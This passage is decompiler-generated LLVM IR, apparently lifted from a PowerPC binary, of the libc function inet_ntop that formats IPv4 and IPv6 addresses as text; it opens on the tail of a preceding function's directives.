  uselistorder label %dec_label_pc_10013aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10013a2c, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_10013ac0 = icmp slt i32 %arg1, 2
  %v3_10013ac0 = icmp eq i32 %arg1, 2
  store i1 %v1_10013ac0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013ac0, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_10013ac0, label %dec_label_pc_10013af0, label %dec_label_pc_10013ae4

dec_label_pc_10013ae4:                            ; preds = %entry
  %v1_10013ae4 = icmp slt i32 %arg1, 10
  %v3_10013ae4 = icmp eq i32 %arg1, 10
  store i1 %v1_10013ae4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013ae4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013ae4, label %dec_label_pc_10013b28.lr.ph, label %dec_label_pc_10013d3c

dec_label_pc_10013af0:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10013b00.715 to i32), i32* @lr, align 4
  %v3_10013afc = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_10013d34

dec_label_pc_10013b28.lr.ph:                      ; preds = %dec_label_pc_10013ae4
  %v2_10013b04 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10013b04, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013b18.716 to i32), i32* @lr, align 4
  %v3_10013b14 = call i32 @__GI_memset(i32 %v2_10013b04, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10013b4815 = load i32, i32* @r27, align 4
  store i32 %v0_10013b4815, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013b28

dec_label_pc_10013b28:                            ; preds = %dec_label_pc_10013b28.lr.ph, %dec_label_pc_10013b28
  %v1_10013b3c = phi i32 [ 0, %dec_label_pc_10013b28.lr.ph ], [ %v1_10013b4c, %dec_label_pc_10013b28 ]
  %v0_10013b28 = phi i32 [ %v0_10013b4815, %dec_label_pc_10013b28.lr.ph ], [ %v0_10013b48, %dec_label_pc_10013b28 ]
  %v0_10013b30 = phi i32 [ %v0_10013b4815, %dec_label_pc_10013b28.lr.ph ], [ %v2_10013b48, %dec_label_pc_10013b28 ]
  %v1_10013b28 = phi i32 [ 0, %dec_label_pc_10013b28.lr.ph ], [ %v0_10013b40, %dec_label_pc_10013b28 ]
  %v2_10013b28 = add i32 %v0_10013b28, %v1_10013b28
  %v3_10013b28 = inttoptr i32 %v2_10013b28 to i8*
  %v4_10013b28 = load i8, i8* %v3_10013b28, align 1
  %v5_10013b28 = zext i8 %v4_10013b28 to i32
  %v1_10013b2c = add i32 %v1_10013b28, 2
  store i32 %v1_10013b2c, i32* %r11.global-to-local, align 4
  %v1_10013b30 = add i32 %v0_10013b30, 1
  %v2_10013b30 = inttoptr i32 %v1_10013b30 to i8*
  %v3_10013b30 = load i8, i8* %v2_10013b30, align 1
  %v4_10013b30 = zext i8 %v3_10013b30 to i32
  %v1_10013b34 = mul nuw nsw i32 %v5_10013b28, 256
  %v2_10013b38 = or i32 %v4_10013b30, %v1_10013b34
  %v2_10013b3c = load i32, i32* %r29.global-to-local, align 4
  %v3_10013b3c = add i32 %v2_10013b3c, %v1_10013b3c
  %v4_10013b3c = inttoptr i32 %v3_10013b3c to i32*
  store i32 %v2_10013b38, i32* %v4_10013b3c, align 4
  %v0_10013b40 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013b40 = udiv i32 %v0_10013b40, 2
  %v0_10013b48 = load i32, i32* @r27, align 4
  %v2_10013b48 = add i32 %v0_10013b48, %v0_10013b40
  store i32 %v2_10013b48, i32* %r9.global-to-local, align 4
  %v1_10013b4c = mul i32 %v1_10013b40, 4
  %v0_10013b50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013b50 = add i32 %v0_10013b50, -1
  store i32 %v1_10013b50, i32* %ctr.global-to-local, align 4
  %v2_10013b50 = icmp eq i32 %v1_10013b50, 0
  br i1 %v2_10013b50, label %dec_label_pc_10013b70.lr.ph, label %dec_label_pc_10013b28

dec_label_pc_10013b70.lr.ph:                      ; preds = %dec_label_pc_10013b28
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013b70

dec_label_pc_10013b70:                            ; preds = %dec_label_pc_10013b70.lr.ph, %dec_label_pc_10013bbc
  %v0_10013bc0 = phi i32 [ 8, %dec_label_pc_10013b70.lr.ph ], [ %v1_10013bc0, %dec_label_pc_10013bbc ]
  %v0_10013bb0 = phi i32 [ -1, %dec_label_pc_10013b70.lr.ph ], [ %v0_10013bb042, %dec_label_pc_10013bbc ]
  %v0_10013ba0 = phi i32 [ -1, %dec_label_pc_10013b70.lr.ph ], [ %v0_10013ba039, %dec_label_pc_10013bbc ]
  %v0_10013b74 = phi i32 [ -1, %dec_label_pc_10013b70.lr.ph ], [ %v0_10013b7435, %dec_label_pc_10013bbc ]
  %v0_10013bbc = phi i32 [ 0, %dec_label_pc_10013b70.lr.ph ], [ %v1_10013bbc, %dec_label_pc_10013bbc ]
  %v1_10013b70 = mul i32 %v0_10013bbc, 4
  %v3_10013b74 = icmp eq i32 %v0_10013b74, -1
  %v2_10013b78 = add i32 %v1_10013b70, %v2_10013b04
  %v3_10013b78 = inttoptr i32 %v2_10013b78 to i32*
  %v4_10013b78 = load i32, i32* %v3_10013b78, align 4
  %v3_10013b7c = icmp eq i32 %v4_10013b78, 0
  br i1 %v3_10013b7c, label %dec_label_pc_10013b84, label %dec_label_pc_10013b9c

dec_label_pc_10013b84:                            ; preds = %dec_label_pc_10013b70
  br i1 %v3_10013b74, label %dec_label_pc_10013b88, label %dec_label_pc_10013b94

dec_label_pc_10013b88:                            ; preds = %dec_label_pc_10013b84
  store i32 %v0_10013bbc, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_10013bbc

dec_label_pc_10013b94:                            ; preds = %dec_label_pc_10013b84
  %v0_10013b94 = load i32, i32* @r31, align 4
  %v1_10013b94 = add i32 %v0_10013b94, 1
  store i32 %v1_10013b94, i32* @r31, align 4
  br label %dec_label_pc_10013bbc

dec_label_pc_10013b9c:                            ; preds = %dec_label_pc_10013b70
  br i1 %v3_10013b74, label %dec_label_pc_10013bbc, label %dec_label_pc_10013ba0

dec_label_pc_10013ba0:                            ; preds = %dec_label_pc_10013b9c
  %v3_10013ba0 = icmp eq i32 %v0_10013ba0, -1
  %v0_10013bb4.pre = load i32, i32* @r31, align 4
  %v1_10013ba8 = load i32, i32* @r30, align 4
  %v3_10013ba8 = icmp sgt i32 %v0_10013bb4.pre, %v1_10013ba8
  %or.cond = or i1 %v3_10013ba0, %v3_10013ba8
  br i1 %or.cond, label %dec_label_pc_10013bb0, label %dec_label_pc_10013bb8

dec_label_pc_10013bb0:                            ; preds = %dec_label_pc_10013ba0
  store i32 %v0_10013bb0, i32* @r28, align 4
  store i32 %v0_10013bb4.pre, i32* @r30, align 4
  br label %dec_label_pc_10013bb8

dec_label_pc_10013bb8:                            ; preds = %dec_label_pc_10013ba0, %dec_label_pc_10013bb0
  %v0_10013ba040 = phi i32 [ %v0_10013bb0, %dec_label_pc_10013bb0 ], [ %v0_10013ba0, %dec_label_pc_10013ba0 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013bbc

dec_label_pc_10013bbc:                            ; preds = %dec_label_pc_10013b9c, %dec_label_pc_10013b94, %dec_label_pc_10013b88, %dec_label_pc_10013bb8
  %v0_10013bb042 = phi i32 [ %v0_10013bb0, %dec_label_pc_10013b9c ], [ %v0_10013bb0, %dec_label_pc_10013b94 ], [ %v0_10013bbc, %dec_label_pc_10013b88 ], [ -1, %dec_label_pc_10013bb8 ]
  %v0_10013b7435 = phi i32 [ -1, %dec_label_pc_10013b9c ], [ %v0_10013b74, %dec_label_pc_10013b94 ], [ %v0_10013bbc, %dec_label_pc_10013b88 ], [ -1, %dec_label_pc_10013bb8 ]
  %v0_10013ba039 = phi i32 [ %v0_10013ba0, %dec_label_pc_10013b9c ], [ %v0_10013ba0, %dec_label_pc_10013b94 ], [ %v0_10013ba0, %dec_label_pc_10013b88 ], [ %v0_10013ba040, %dec_label_pc_10013bb8 ]
  %v1_10013bbc = add nuw nsw i32 %v0_10013bbc, 1
  store i32 %v1_10013bbc, i32* %r11.global-to-local, align 4
  %v1_10013bc0 = add nsw i32 %v0_10013bc0, -1
  store i32 %v1_10013bc0, i32* %ctr.global-to-local, align 4
  %v2_10013bc0 = icmp eq i32 %v1_10013bc0, 0
  br i1 %v2_10013bc0, label %dec_label_pc_10013bc4, label %dec_label_pc_10013b70

dec_label_pc_10013bc4:                            ; preds = %dec_label_pc_10013bbc
  %v3_10013bc4 = icmp eq i32 %v0_10013bb042, -1
  %v1_10013be4 = icmp slt i32 %v0_10013ba039, -1
  %v3_10013be4 = icmp eq i32 %v0_10013ba039, -1
  store i1 %v1_10013be4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013be4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013bc4, label %dec_label_pc_10013be4, label %dec_label_pc_10013bcc

dec_label_pc_10013bcc:                            ; preds = %dec_label_pc_10013bc4
  %v0_10013bdc.pre = load i32, i32* @r31, align 4
  br i1 %v3_10013be4, label %dec_label_pc_10013bdc, label %dec_label_pc_10013bd4

dec_label_pc_10013bd4:                            ; preds = %dec_label_pc_10013bcc
  %v1_10013bd4 = load i32, i32* @r30, align 4
  %v2_10013bd4 = icmp slt i32 %v0_10013bdc.pre, %v1_10013bd4
  %v3_10013bd4 = icmp sgt i32 %v0_10013bdc.pre, %v1_10013bd4
  %v4_10013bd4 = icmp eq i32 %v0_10013bdc.pre, %v1_10013bd4
  store i1 %v2_10013bd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013bd4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013bd4, label %dec_label_pc_10013bdc, label %dec_label_pc_10013be4.thread

dec_label_pc_10013bdc:                            ; preds = %dec_label_pc_10013bcc, %dec_label_pc_10013bd4
  store i32 %v0_10013bdc.pre, i32* @r30, align 4
  store i32 %v0_10013bb042, i32* @r28, align 4
  br label %dec_label_pc_10013be4.thread

dec_label_pc_10013be4.thread:                     ; preds = %dec_label_pc_10013bdc, %dec_label_pc_10013bd4
  %v0_10013bec76 = phi i32 [ %v1_10013bd4, %dec_label_pc_10013bd4 ], [ %v0_10013bdc.pre, %dec_label_pc_10013bdc ]
  %v0_10013be4.ph = phi i32 [ %v0_10013ba039, %dec_label_pc_10013bd4 ], [ %v0_10013bb042, %dec_label_pc_10013bdc ]
  %v1_10013be459 = icmp slt i32 %v0_10013be4.ph, -1
  %v3_10013be461 = icmp eq i32 %v0_10013be4.ph, -1
  store i1 %v1_10013be459, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013be461, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10013bec

dec_label_pc_10013be4:                            ; preds = %dec_label_pc_10013bc4
  br i1 %v3_10013be4, label %dec_label_pc_10013bf8, label %dec_label_pc_10013be4.dec_label_pc_10013bec_crit_edge

dec_label_pc_10013be4.dec_label_pc_10013bec_crit_edge: ; preds = %dec_label_pc_10013be4
  %v0_10013bec.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10013bec

dec_label_pc_10013bec:                            ; preds = %dec_label_pc_10013be4.dec_label_pc_10013bec_crit_edge, %dec_label_pc_10013be4.thread
  %v0_10013bec = phi i32 [ %v0_10013bec76, %dec_label_pc_10013be4.thread ], [ %v0_10013bec.pre, %dec_label_pc_10013be4.dec_label_pc_10013bec_crit_edge ]
  %v0_10013be462 = phi i32 [ %v0_10013be4.ph, %dec_label_pc_10013be4.thread ], [ %v0_10013ba039, %dec_label_pc_10013be4.dec_label_pc_10013bec_crit_edge ]
  %v1_10013bec = icmp slt i32 %v0_10013bec, 1
  %v2_10013bec = icmp sgt i32 %v0_10013bec, 1
  %v3_10013bec = icmp eq i32 %v0_10013bec, 1
  store i1 %v1_10013bec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013bec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10013bec, label %dec_label_pc_10013bf8, label %dec_label_pc_10013bf4

dec_label_pc_10013bf4:                            ; preds = %dec_label_pc_10013bec
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10013bf8

dec_label_pc_10013bf8:                            ; preds = %dec_label_pc_10013bec, %dec_label_pc_10013be4, %dec_label_pc_10013bf4
  %v0_10013c043 = phi i32 [ %v0_10013be462, %dec_label_pc_10013bec ], [ -1, %dec_label_pc_10013be4 ], [ -1, %dec_label_pc_10013bf4 ]
  %v2_10013bf8 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10013bf8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_10013c044 = icmp slt i32 %v0_10013c043, -1
  %v3_10013c046 = icmp eq i32 %v0_10013c043, -1
  store i1 %v1_10013c044, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c046, i1* %cr7_eq.global-to-local, align 1
  %v2_10013c74 = icmp slt i32 %tmp, 65535
  %v4_10013c74 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10013c04

dec_label_pc_10013c04:                            ; preds = %dec_label_pc_10013bf8, %dec_label_pc_10013cd0
  %v2_10013c40 = phi i32 [ %v2_10013bf8, %dec_label_pc_10013bf8 ], [ %v2_10013c2851, %dec_label_pc_10013cd0 ]
  %v0_10013c14 = phi i32 [ %v0_10013c043, %dec_label_pc_10013bf8 ], [ %v0_10013c04, %dec_label_pc_10013cd0 ]
  %v0_10013c34 = phi i32 [ 0, %dec_label_pc_10013bf8 ], [ %v1_10013cd0, %dec_label_pc_10013cd0 ]
  %v3_10013c047 = phi i1 [ %v3_10013c046, %dec_label_pc_10013bf8 ], [ %v3_10013c04, %dec_label_pc_10013cd0 ]
  br i1 %v3_10013c047, label %dec_label_pc_10013c34, label %dec_label_pc_10013c0c

dec_label_pc_10013c0c:                            ; preds = %dec_label_pc_10013c04
  %v2_10013c0c = icmp slt i32 %v0_10013c34, %v0_10013c14
  %v4_10013c0c = icmp eq i32 %v0_10013c34, %v0_10013c14
  br i1 %v2_10013c0c, label %dec_label_pc_10013c34, label %dec_label_pc_10013c14

dec_label_pc_10013c14:                            ; preds = %dec_label_pc_10013c0c
  %v1_10013c14 = load i32, i32* @r30, align 4
  %v2_10013c14 = add i32 %v1_10013c14, %v0_10013c14
  %v2_10013c18 = icmp slt i32 %v0_10013c34, %v2_10013c14
  %v4_10013c18 = icmp eq i32 %v0_10013c34, %v2_10013c14
  store i1 %v2_10013c18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013c18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10013c18, label %dec_label_pc_10013c20, label %dec_label_pc_10013c34

dec_label_pc_10013c20:                            ; preds = %dec_label_pc_10013c14
  br i1 %v4_10013c0c, label %dec_label_pc_10013c24, label %dec_label_pc_10013cd0

dec_label_pc_10013c24:                            ; preds = %dec_label_pc_10013c20
  %v3_10013c28 = inttoptr i32 %v2_10013c40 to i8*
  store i8 58, i8* %v3_10013c28, align 1
  %v0_10013c2c = load i32, i32* %r29.global-to-local, align 4
  %v1_10013c2c = add i32 %v0_10013c2c, 1
  store i32 %v1_10013c2c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10013cd0

dec_label_pc_10013c34:                            ; preds = %dec_label_pc_10013c14, %dec_label_pc_10013c0c, %dec_label_pc_10013c04
  %v1_10013c34 = icmp slt i32 %v0_10013c34, 0
  %v3_10013c34 = icmp eq i32 %v0_10013c34, 0
  store i1 %v1_10013c34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c34, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c34, label %dec_label_pc_10013c48.thread, label %dec_label_pc_10013c48

dec_label_pc_10013c48.thread:                     ; preds = %dec_label_pc_10013c34
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10013cac

dec_label_pc_10013c48:                            ; preds = %dec_label_pc_10013c34
  %v3_10013c40 = inttoptr i32 %v2_10013c40 to i8*
  store i8 58, i8* %v3_10013c40, align 1
  %v0_10013c44 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013c44 = add i32 %v0_10013c44, 1
  store i32 %v1_10013c44, i32* %r29.global-to-local, align 4
  %v0_10013c48.pre = load i32, i32* @r31, align 4
  %v1_10013c48 = icmp slt i32 %v0_10013c48.pre, 6
  %v3_10013c48 = icmp eq i32 %v0_10013c48.pre, 6
  store i1 %v1_10013c48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c48, label %dec_label_pc_10013c50, label %dec_label_pc_10013cac

dec_label_pc_10013c50:                            ; preds = %dec_label_pc_10013c48
  %v0_10013c50 = load i32, i32* @r28, align 4
  %v1_10013c50 = icmp slt i32 %v0_10013c50, 0
  %v3_10013c50 = icmp eq i32 %v0_10013c50, 0
  store i1 %v1_10013c50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c50, label %dec_label_pc_10013c58, label %dec_label_pc_10013cac

dec_label_pc_10013c58:                            ; preds = %dec_label_pc_10013c50
  %v0_10013c58 = load i32, i32* @r30, align 4
  %v1_10013c58 = icmp slt i32 %v0_10013c58, 6
  %v3_10013c58 = icmp eq i32 %v0_10013c58, 6
  store i1 %v1_10013c58, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c58, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c58, label %dec_label_pc_10013c7c, label %dec_label_pc_10013c60

dec_label_pc_10013c60:                            ; preds = %dec_label_pc_10013c58
  %v1_10013c60 = icmp slt i32 %v0_10013c58, 5
  %v3_10013c60 = icmp eq i32 %v0_10013c58, 5
  store i1 %v1_10013c60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c60, label %dec_label_pc_10013c68, label %dec_label_pc_10013cac

dec_label_pc_10013c68:                            ; preds = %dec_label_pc_10013c60
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10013c74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013c74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10013c74, label %dec_label_pc_10013c7c, label %dec_label_pc_10013cac

dec_label_pc_10013c7c:                            ; preds = %dec_label_pc_10013c68, %dec_label_pc_10013c58
  %v1_10013c7c = load i32, i32* @r1, align 4
  %v2_10013c7c = sub i32 %v1_10013c7c, %v1_10013c44
  %v0_10013c80 = load i32, i32* @r27, align 4
  %v1_10013c80 = add i32 %v0_10013c80, 12
  %v1_10013c84 = add i32 %v2_10013c7c, 86
  store i32 ptrtoint ([3 x i8]* @global_var_10013c90.717 to i32), i32* @lr, align 4
  %v3_10013c8c = call i32 @inet_ntop4(i32 %v1_10013c80, i32 %v1_10013c44, i32 %v1_10013c84)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10013c94 = icmp slt i32 %v3_10013c8c, 0
  %v3_10013c94 = icmp eq i32 %v3_10013c8c, 0
  store i1 %v1_10013c94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c94, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c94, label %dec_label_pc_10013d4c, label %dec_label_pc_10013c9c

dec_label_pc_10013c9c:                            ; preds = %dec_label_pc_10013c7c
  %v0_10013c9c = load i32, i32* @r29, align 4
  store i32 %v0_10013c9c, i32* @r3, align 4
  %v0_10013ca0 = call i32 @__GI_strlen()
  %v0_10013ca4 = load i32, i32* @r29, align 4
  %v2_10013ca4 = add i32 %v0_10013ca4, %v0_10013ca0
  store i32 %v2_10013ca4, i32* %r29.global-to-local, align 4
  %v0_10013ce4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10013ce4

dec_label_pc_10013cac:                            ; preds = %dec_label_pc_10013c48.thread, %dec_label_pc_10013c68, %dec_label_pc_10013c60, %dec_label_pc_10013c50, %dec_label_pc_10013c48
  %v0_10013cac67 = phi i32 [ 0, %dec_label_pc_10013c48.thread ], [ 6, %dec_label_pc_10013c68 ], [ 6, %dec_label_pc_10013c60 ], [ 6, %dec_label_pc_10013c50 ], [ %v0_10013c48.pre, %dec_label_pc_10013c48 ]
  %v0_10013c8866 = phi i32 [ %v2_10013c40, %dec_label_pc_10013c48.thread ], [ %v1_10013c44, %dec_label_pc_10013c68 ], [ %v1_10013c44, %dec_label_pc_10013c60 ], [ %v1_10013c44, %dec_label_pc_10013c50 ], [ %v1_10013c44, %dec_label_pc_10013c48 ]
  %v1_10013cac = mul i32 %v0_10013cac67, 4
  store i32 %v2_10013b04, i32* %r9.global-to-local, align 4
  %v2_10013cb4 = add i32 %v1_10013cac, %v2_10013b04
  %v3_10013cb4 = inttoptr i32 %v2_10013cb4 to i32*
  %v4_10013cb4 = load i32, i32* %v3_10013cb4, align 4
  store i32 %v0_10013c8866, i32* @r3, align 4
  store i32 268516556, i32* @lr, align 4
  %v5_10013cc8 = load i32, i32* @r7, align 4
  %v6_10013cc8 = load i32, i32* @r8, align 4
  %v9_10013cc8 = call i32 @sprintf(i32 %v0_10013c8866, i32 ptrtoint ([3 x i8]* @global_var_10017bbc.718 to i32), i32 %v4_10013cb4, i32 %v2_10013b04, i32 %v5_10013cc8, i32 %v6_10013cc8, i32 %v2_10013b04, i32 ptrtoint (i32* @0 to i32))
  %v0_10013ccc = load i32, i32* @r29, align 4
  %v2_10013ccc = add i32 %v0_10013ccc, %v9_10013cc8
  store i32 %v2_10013ccc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10013cd0

dec_label_pc_10013cd0:                            ; preds = %dec_label_pc_10013c20, %dec_label_pc_10013c24, %dec_label_pc_10013cac
  %v2_10013c2851 = phi i32 [ %v2_10013c40, %dec_label_pc_10013c20 ], [ %v1_10013c2c, %dec_label_pc_10013c24 ], [ %v2_10013ccc, %dec_label_pc_10013cac ]
  %v0_10013cd0 = load i32, i32* @r31, align 4
  %v1_10013cd0 = add i32 %v0_10013cd0, 1
  store i32 %v1_10013cd0, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_10013cd0, 8
  %v0_10013c04 = load i32, i32* @r28, align 4
  %v1_10013c04 = icmp slt i32 %v0_10013c04, -1
  %v3_10013c04 = icmp eq i32 %v0_10013c04, -1
  store i1 %v1_10013c04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013c04, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10013c04, label %dec_label_pc_10013cdc

dec_label_pc_10013cdc:                            ; preds = %dec_label_pc_10013cd0
  br i1 %v3_10013c04, label %dec_label_pc_10013cfc, label %dec_label_pc_10013ce4

dec_label_pc_10013ce4:                            ; preds = %dec_label_pc_10013cdc, %dec_label_pc_10013c9c
  %v2_10013cf4 = phi i32 [ %v2_10013c2851, %dec_label_pc_10013cdc ], [ %v2_10013ca4, %dec_label_pc_10013c9c ]
  %v0_10013ce4 = phi i32 [ %v0_10013c04, %dec_label_pc_10013cdc ], [ %v0_10013ce4.pre, %dec_label_pc_10013c9c ]
  %v1_10013ce4 = load i32, i32* @r30, align 4
  %v2_10013ce4 = add i32 %v1_10013ce4, %v0_10013ce4
  %v1_10013ce8 = icmp slt i32 %v2_10013ce4, 8
  %v3_10013ce8 = icmp eq i32 %v2_10013ce4, 8
  store i1 %v1_10013ce8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013ce8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013ce8, label %dec_label_pc_10013cf0, label %dec_label_pc_10013cfc

dec_label_pc_10013cf0:                            ; preds = %dec_label_pc_10013ce4
  %v3_10013cf4 = inttoptr i32 %v2_10013cf4 to i8*
  store i8 58, i8* %v3_10013cf4, align 1
  %v0_10013cf8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013cf8 = add i32 %v0_10013cf8, 1
  store i32 %v1_10013cf8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10013cfc

dec_label_pc_10013cfc:                            ; preds = %dec_label_pc_10013ce4, %dec_label_pc_10013cdc, %dec_label_pc_10013cf0
  %v2_10013d10 = phi i32 [ %v2_10013cf4, %dec_label_pc_10013ce4 ], [ %v2_10013c2851, %dec_label_pc_10013cdc ], [ %v1_10013cf8, %dec_label_pc_10013cf0 ]
  %v1_10013cfc = sub i32 1, %v2_10013bf8
  %v2_10013d04 = add i32 %v1_10013cfc, %v2_10013d10
  %v1_10013d08 = load i32, i32* @r26, align 4
  %v2_10013d08 = icmp ult i32 %v2_10013d04, %v1_10013d08
  %v4_10013d08 = icmp eq i32 %v2_10013d04, %v1_10013d08
  store i1 %v2_10013d08, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013d08, i1* %cr7_eq.global-to-local, align 1
  %v3_10013d10 = inttoptr i32 %v2_10013d10 to i8*
  store i8 0, i8* %v3_10013d10, align 1
  %v0_10013d14 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10013d14 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10013d14 = or i1 %v0_10013d14, %v1_10013d14
  br i1 %v2_10013d14, label %dec_label_pc_10013d2c, label %dec_label_pc_10013d18

dec_label_pc_10013d18:                            ; preds = %dec_label_pc_10013cfc
  %v0_10013d18 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013d24 = inttoptr i32 %v0_10013d18 to i32*
  store i32 28, i32* %v2_10013d24, align 4
  %v0_10013d50.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013d4c

dec_label_pc_10013d2c:                            ; preds = %dec_label_pc_10013cfc
  %v0_10013d2c = load i32, i32* @r25, align 4
  %v2_10013d30 = bitcast i32* %stack_var_-88 to i8*
  %v3_10013d30 = call i32 @strcpy(i32 %v0_10013d2c, i8* %v2_10013d30)
  br label %dec_label_pc_10013d34

dec_label_pc_10013d34:                            ; preds = %dec_label_pc_10013af0, %dec_label_pc_10013d2c
  %storemerge1 = phi i32 [ %v3_10013afc, %dec_label_pc_10013af0 ], [ %v3_10013d30, %dec_label_pc_10013d2c ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013d4c

dec_label_pc_10013d3c:                            ; preds = %dec_label_pc_10013ae4
  %v0_10013d3c = call i32 @__errno_location()
  %v2_10013d44 = inttoptr i32 %v0_10013d3c to i32*
  store i32 97, i32* %v2_10013d44, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013d4c

dec_label_pc_10013d4c:                            ; preds = %dec_label_pc_10013c7c, %dec_label_pc_10013d34, %dec_label_pc_10013d18, %dec_label_pc_10013d3c
  %v0_10013d50 = phi i32 [ 0, %dec_label_pc_10013c7c ], [ %storemerge1, %dec_label_pc_10013d34 ], [ %v0_10013d50.pre, %dec_label_pc_10013d18 ], [ 0, %dec_label_pc_10013d3c ]
  ret i32 %v0_10013d50

; uselistorder directives
  uselistorder i32 %v2_10013d10, { 1, 0 }
  uselistorder i32 %v2_10013ce4, { 1, 0 }
  uselistorder i1 %v3_10013c04, { 0, 2, 1 }
  uselistorder i32 %v0_10013c04, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10013cd0, { 2, 1, 0 }
  uselistorder i32 %v0_10013c8866, { 1, 0 }
  uselistorder i32 %v3_10013c8c, { 1, 0 }
  uselistorder i32 %v0_10013c58, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013c48.pre, { 2, 0, 1 }
  uselistorder i32 %v1_10013c44, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_10013c14, { 1, 0 }
  uselistorder i32 %v0_10013c34, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_10013c14, { 0, 2, 1 }
  uselistorder i32 %v2_10013c40, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10013c043, { 0, 2, 1 }
  uselistorder i32 %v0_10013bec, { 2, 1, 0 }
  uselistorder i32 %v0_10013bdc.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_10013be4, { 1, 0, 2 }
  uselistorder i32 %v1_10013bc0, { 2, 1, 0 }
  uselistorder i32 %v1_10013bbc, { 1, 0 }
  uselistorder i32 %v0_10013ba039, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_10013bb042, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10013b74, { 1, 0 }
  uselistorder i32 %v0_10013bbc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10013b74, { 1, 0 }
